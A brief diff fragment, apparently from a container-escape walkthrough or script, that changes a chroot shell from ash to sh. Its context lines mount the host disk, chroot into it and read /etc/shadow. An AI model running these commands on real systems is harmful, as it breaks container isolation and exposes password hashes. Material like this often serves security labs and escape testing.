@@ -33,7 +33,7 @@
  capsh --print|grep 'Bounding set'
  mkdir -p /mnt/host
  mount /dev/vda2 /mnt/host
- chroot /mnt/host /bin/ash
+ chroot /mnt/host /bin/sh
  cat /etc/shadow
  exit
  cat /etc/shadow
